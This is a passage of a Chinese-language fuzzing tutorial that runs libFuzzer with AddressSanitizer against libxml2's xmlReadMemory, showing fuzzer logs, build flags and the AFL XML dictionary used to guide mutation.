class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">139</span>/<span class="number">1470</span> MS: <span class="number">2</span> ChangeByte-EraseBytes-</span><br><span class="line">#<span class="number">2485127</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">622</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2485277</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">93</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2485465</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9897</span> corp: <span class="number">3525</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">40</span>/<span class="number">1470</span> MS: <span class="number">1</span> PersAutoDict- DE: <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x05&quot;</span>-</span><br><span class="line">#<span class="number">2485715</span>NEW    cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">1092</span>/<span class="number">1470</span> MS: <span class="number">3</span> ChangeBit-CopyPart-CopyPart-</span><br><span class="line">#<span class="number">2485805</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">25</span>/<span class="number">1470</span> MS: <span class="number">2</span> ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2486420</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">336</span>/<span class="number">1470</span> MS: <span class="number">2</span> InsertByte-EraseBytes-</span><br><span class="line">#<span class="number">2486677</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">33</span>/<span class="number">1470</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">2486836</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">142</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2487217</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">555</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2487243</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9901</span> corp: <span class="number">3527</span>/<span class="number">673</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">1464</span>/<span class="number">1470</span> MS: <span class="number">1</span> CopyPart-</span><br><span class="line">#<span class="number">2487595</span>NEW    cov: <span class="number">2019</span> ft: <span class="number">9902</span> corp: <span class="number">3528</span>/<span class="number">675</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2035</span> rss: <span class="number">553</span>Mb L: <span class="number">1430</span>/<span class="number">1470</span> MS: <span class="number">4</span> ShuffleBytes-ChangeByte-ChangeBinInt-CopyPart-</span><br><span class="line">#<span class="number">2487978</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9902</span> corp: <span class="number">3528</span>/<span class="number">675</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2035</span> rss: <span class="number">553</span>Mb L: <span class="number">34</span>/<span class="number">1470</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">2487997</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9902</span> corp: <span class="number">3528</span>/<span class="number">675</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">534</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2488103</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9902</span> corp: <span class="number">3528</span>/<span class="number">675</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">62</span>/<span class="number">1470</span> MS: <span class="number">4</span> ChangeBit-PersAutoDict-ShuffleBytes-EraseBytes- DE: <span class="string">&quot;UT&quot;</span>-</span><br></pre></td></tr></table></figure><p>但迟迟没有crash。这可能有很多原因：1.程序很健壮。2.我们选择的接口函数不合适 3.异常检测的设置不当。<br>这三个可能的原因中程序是否健壮我们不得而知，接口函数是否合适我们通过覆盖率了解到以<code>xmlReadMemory</code>作为入口函数执行到的代码块还是较高的，但也有可能因为漏洞不在接口函数的部分。第三个可能，由于异常检测的设置不当导致即使产生了异常但因为于设置的异常检测不匹配和没有捕获到。回头看下我们的santize设置为address开启内存错误检测器(AddressSanitizer)，该选项较为通用且宽泛(无非stack&#x2F;heap_overflow)，但其实还有一些更具针对行的选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-fsanitize-address-field-padding=&lt;value&gt;</span><br><span class="line">                         Level of field padding for AddressSanitizer</span><br><span class="line"> -fsanitize-address-globals-dead-stripping</span><br><span class="line">                         Enable linker dead stripping of globals in AddressSanitizer</span><br><span class="line"> -fsanitize-address-poison-custom-array-cookie</span><br><span class="line">                         Enable poisoning array cookies when using custom operator new[] in AddressSanitizer</span><br><span class="line"> -fsanitize-address-use-after-scope</span><br><span class="line">                         Enable use-after-scope detection in AddressSanitizer</span><br><span class="line"> -fsanitize-address-use-odr-indicator</span><br><span class="line">                         Enable ODR indicator globals to avoid false ODR violation reports in partially sanitized programs at the cost of an increase in binary size</span><br></pre></td></tr></table></figure><p>其中有一个<code>-fsanitize-address-use-after-scope</code>描述为开启use-after-scope检测，将其加入到编译选项中，再次编译。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;</span><br><span class="line"></span><br><span class="line">CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \</span><br><span class="line">    CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot;  ./configure</span><br><span class="line"></span><br><span class="line">make -j$(nproc)</span><br><span class="line">clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=c++11 xml_read_memory_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1</span><br></pre></td></tr></table></figure><p>跑了一会儿依然没有收获，看来这将会是一个较长时间的过程。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1823774</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9428</span> corp: <span class="number">3417</span>/<span class="number">499</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2867</span> rss: <span class="number">546</span>Mb L: <span class="number">229</span>/<span class="number">1150</span> MS: <span class="number">4</span> ChangeBinInt-InsertByte-InsertByte-EraseBytes-</span><br><span class="line">#<span class="number">1823804</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2867</span> rss: <span class="number">546</span>Mb L: <span class="number">508</span>/<span class="number">1150</span> MS: <span class="number">3</span> CopyPart-EraseBytes-CopyPart-</span><br><span class="line">#<span class="number">1824507</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2868</span> rss: <span class="number">546</span>Mb L: <span class="number">24</span>/<span class="number">1150</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1824608</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2864</span> rss: <span class="number">546</span>Mb L: <span class="number">474</span>/<span class="number">1150</span> MS: <span class="number">4</span> InsertRepeatedBytes-ChangeASCIIInt-PersAutoDict-CrossOver- DE: <span class="string">&quot;\xff\xff\xffN&quot;</span>-</span><br><span class="line">#<span class="number">1824748</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2864</span> rss: <span class="number">546</span>Mb L: <span class="number">1066</span>/<span class="number">1143</span> MS: <span class="number">5</span> ChangeASCIIInt-CMP-PersAutoDict-ChangeBit-EraseBytes- DE: <span class="string">&quot;ISO-8859-1&quot;</span>-<span class="string">&quot;\xfe\xff\xff&quot;</span>-</span><br><span class="line">#<span class="number">1825344</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2865</span> rss: <span class="number">546</span>Mb L: <span class="number">25</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1825716</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2866</span> rss: <span class="number">546</span>Mb L: <span class="number">437</span>/<span class="number">1143</span> MS: <span class="number">3</span> InsertRepeatedBytes-InsertRepeatedBytes-EraseBytes-</span><br><span class="line">#<span class="number">1825879</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2866</span> rss: <span class="number">546</span>Mb L: <span class="number">73</span>/<span class="number">1143</span> MS: <span class="number">4</span> CMP-ChangeASCIIInt-ChangeBit-EraseBytes- DE: <span class="string">&quot;\x01\x00\x00P&quot;</span>-</span><br><span class="line">#<span class="number">1826898</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2863</span> rss: <span class="number">546</span>Mb L: <span class="number">453</span>/<span class="number">1143</span> MS: <span class="number">3</span> ChangeByte-ChangeASCIIInt-EraseBytes-</span><br><span class="line">#<span class="number">1827221</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2863</span> rss: <span class="number">546</span>Mb L: <span class="number">404</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1827788</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2864</span> rss: <span class="number">546</span>Mb L: <span class="number">47</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1828282</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">112</span>/<span class="number">1143</span> MS: <span class="number">4</span> CMP-ChangeBit-ChangeByte-EraseBytes- DE: <span class="string">&quot;O&gt;/&lt;&quot;</span>-</span><br><span class="line">#<span class="number">1828714</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">7</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1828728</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">163</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1828756</span>NEW    cov: <span class="number">2020</span> ft: <span class="number">9430</span> corp: <span class="number">3419</span>/<span class="number">501</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">1155</span>/<span class="number">1155</span> MS: <span class="number">1</span> CopyPart-</span><br><span class="line">#<span class="number">1828812</span>REDUCE cov: <span class="number">2020</span> ft: <span class="number">9430</span> corp: <span class="number">3419</span>/<span class="number">501</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">42</span>/<span class="number">1155</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">1828952</span>REDUCE cov: <span class="number">2020</span> ft: <span class="number">9430</span> corp: <span class="number">3419</span>/<span class="number">501</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2862</span> rss: <span class="number">546</span>Mb L: <span class="number">380</span>/<span class="number">1155</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1829111</span>REDUCE cov: <span class="number">2020</span> ft: <span class="number">9430</span> corp: <span class="number">3419</span>/<span class="number">501</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2862</span> rss: <span class="number">546</span>Mb L: <span class="number">542</span>/<span class="number">1155</span> MS: <span class="number">3</span> InsertByte-ChangeASCIIInt-EraseBytes-</span><br></pre></td></tr></table></figure><p>但我们不能放任其fuzz，要想一些办法去提高我们fuzz的效率，这其中一个办法就是使用字典。</p><p>我们知道基本上所有的程序都是处理的数据其格式是不同的，比如 xml文档， png图片等等。这些数据中会有一些特殊字符序列 （或者说关键字）， 比如在xml文档中就有CDATA，&lt;!ATTLIST等，png图片就有png 图片头。如果我们事先就把这些字符序列列举出来吗，fuzz直接使用这些关键字去组合，就会就可以减少很多没有意义的尝试，同时还有可能会走到更深的程序分支中去。<br>这里whorkshop就提供了AFL中所使用的dict:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">//xml.dict</span><br><span class="line">➜  08 git:(master) ✗ cat xml.dict </span><br><span class="line"># Copyright 2016 Google Inc.</span><br><span class="line">#</span><br><span class="line"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line"># you may not use this file except in compliance with the License.</span><br><span class="line"># You may obtain a copy of the License at</span><br><span class="line">#</span><br><span class="line">#      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">#</span><br><span class="line"># Unless required by applicable law or agreed to in writing, software</span><br><span class="line"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line"># See the License for the specific language governing permissions and</span><br><span class="line"># limitations under the License.</span><br><span class="line">#</span><br><span class="line">################################################################################</span><br><span class="line">#</span><br><span class="line"># AFL dictionary for XML</span><br><span class="line"># ----------------------</span><br><span class="line">#</span><br><span class="line"># Several basic syntax elements and attributes, modeled on libxml2.</span><br><span class="line">#</span><br><span class="line"># Created by Michal Zalewski &lt;lcamtuf@google.com&gt;</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">attr_encoding=&quot; encoding=\&quot;1\&quot;&quot;</span><br><span class="line">attr_generic=&quot; a=\&quot;1\&quot;&quot;</span><br><span class="line">attr_href=&quot; href=\&quot;1\&quot;&quot;</span><br><span class="line">attr_standalone=&quot; standalone=\&quot;no\&quot;&quot;</span><br><span class="line">attr_version=&quot; version=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xml_base=&quot; xml:base=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xml_id=&quot; xml:id=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xml_lang=&quot; xml:lang=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xml_space=&quot; xml:space=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xmlns=&quot; xmlns=\&quot;1\&quot;&quot;</span><br><span class="line"></span><br><span class="line">entity_builtin=&quot;&amp;lt;&quot;</span><br><span class="line">entity_decimal=&quot;&amp;#1;&quot;</span><br><span class="line">entity_external=&quot;&amp;a;&quot;</span><br><span class="line">entity_hex=&quot;&amp;#x1;&quot;</span><br><span class="line"></span><br><span class="line">string_any=&quot;ANY&quot;</span><br><span class="line">string_brackets=&quot;[]&quot;</span><br><span class="line">string_cdata=&quot;CDATA&quot;</span><br><span class="line">string_col_fallback=&quot;:fallback&quot;</span><br><span class="line">string_col_generic=&quot;:a&quot;</span><br><span class="line">string_col_include=&quot;:include&quot;</span><br><span class="line">string_dashes=&quot;--&quot;</span><br><span class="line">string_empty=&quot;EMPTY&quot;</span><br><span class="line">string_empty_dblquotes=&quot;\&quot;\&quot;&quot;</span><br><span class="line">string_empty_quotes=&quot;&#x27;&#x27;&quot;</span><br><span class="line">string_entities=&quot;ENTITIES&quot;</span><br><span class="line">string_entity=&quot;ENTITY&quot;</span><br><span class="line">string_fixed=&quot;#FIXED&quot;</span><br><span class="line">string_id=&quot;ID&quot;</span><br><span class="line">string_idref=&quot;IDREF&quot;</span><br><span class="line">string_idrefs=&quot;IDREFS&quot;</span><br><span class="line">string_implied=&quot;#IMPLIED&quot;</span><br><span class="line">string_nmtoken=&quot;NMTOKEN&quot;</span><br><span class="line">string_nmtokens=&quot;NMTOKENS&quot;</span><br><span class="line">string_notation=&quot;NOTATION&quot;</span><br><span class="line">string_parentheses=&quot;()&quot;</span><br><span class="line">string_pcdata=&quot;#PCDATA&quot;</span><br><span class="line">string_percent=&quot;%a&quot;</span><br><span class="line">string_public=&quot;PUBLIC&quot;</span><br><span class="line">string_required=&quot;#REQUIRED&quot;</span><br><span class="line">string_schema=&quot;:schema&quot;</span><br><span class="line">string_system=&quot;SYSTEM&quot;</span><br><span class="line">string_ucs4=&quot;UCS-4&quot;</span><br><span class="line">string_utf16=&quot;UTF-16&quot;</span><br><span class="line">string_utf8=&quot;UTF-8&quot;</span><br><span class="line">string_xmlns=&quot;xmlns:&quot;</span><br><span class="line"></span><br><span class="line">tag_attlist=&quot;&lt;!ATTLIST&quot;</span><br><span class="line">tag_cdata=&quot;&lt;![CDATA[&quot;</span><br><span class="line">tag_close=&quot;&lt;/a&gt;&quot;</span><br><span class="line">tag_doctype=&quot;&lt;!DOCTYPE&quot;</span><br><span class="line">tag_element=&quot;&lt;!ELEMENT&quot;</span><br><span class="line">tag_entity=&quot;&lt;!ENTITY&quot;</span><br><span class="line">tag_ignore=&quot;&lt;![IGNORE[&quot;</span><br><span class="line">tag_include=&quot;&lt;![INCLUDE[&quot;</span><br><span class="line">tag_notation=&quot;&lt;!NOTATION&quot;</span><br><span class="line">tag_open=&quot;&lt;a&gt;&quot;</span><br><span class="line">tag_open_close=&quot;&lt;a /&gt;&quot;</span><br><span class="line">tag_open_exclamation=&quot;&lt;!&quot;</span><br><span class="line">tag_open_q=&quot;&lt;?&quot;</span><br><span class="line">tag_sq2_close=&quot;]]&gt;&quot;</span><br><span class="line">tag_xml_q=&quot;&lt;?xml?&gt;&quot;</span><br></pre></td></tr></table></figure><p>其中关键字就是””里的内容，libfuzzer会使用这些关键字进行组合来生成样本。字典使用方法<code>./libxml2-v2.9.2-fsanitize_fuzzer1 -max_total_time=60 -print_final_stats=1 -dict=./xml.dict corpus1</code><br>执行结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">468074</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8272</span> corp: <span class="number">2493</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7801</span> rss: <span class="number">452</span>Mb L: <span class="number">105</span>/<span class="number">135</span> MS: <span class="number">4</span> InsertRepeatedBytes-CMP-CopyPart-CrossOver- DE: <span class="string">&quot;\x01\x00\x00\x00&quot;</span>-</span><br><span class="line">#<span class="number">468322</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8272</span> corp: <span class="number">2493</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7805</span> rss: <span class="number">452</span>Mb L: <span class="number">85</span>/<span class="number">135</span> MS: <span class="number">3</span> CopyPart-CopyPart-EraseBytes-</span><br><span class="line">#<span class="number">468381</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8273</span> corp: <span class="number">2494</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7806</span> rss: <span class="number">452</span>Mb L: <span class="number">74</span>/<span class="number">135</span> MS: <span class="number">1</span> InsertByte-</span><br><span class="line">#<span class="number">468390</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8273</span> corp: <span class="number">2494</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7806</span> rss: <span class="number">452</span>Mb L: <span class="number">66</span>/<span class="number">135</span> MS: <span class="number">2</span> ChangeASCIIInt-EraseBytes-</span><br><span class="line">#<span class="number">468391</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8273</span> corp: <span class="number">2494</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7806</span> rss: <span class="number">452</span>Mb L: <span class="number">89</span>/<span class="number">135</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">468575</span>DONE   cov: <span class="number">2521</span> ft: <span class="number">8273</span> corp: <span class="number">2494</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7681</span> rss: <span class="number">452</span>Mb</span><br><span class="line">###### Recommended dictionary. ######</span><br><span class="line"><span class="string">&quot;\x08\x00&quot;</span> # Uses: <span class="number">366</span></span><br><span class="line"><span class="string">&quot;Q\x00&quot;</span> # Uses: <span class="number">370</span></span><br><span class="line"><span class="string">&quot;\x00:&quot;</span> # Uses: <span class="number">325</span></span><br><span class="line"><span 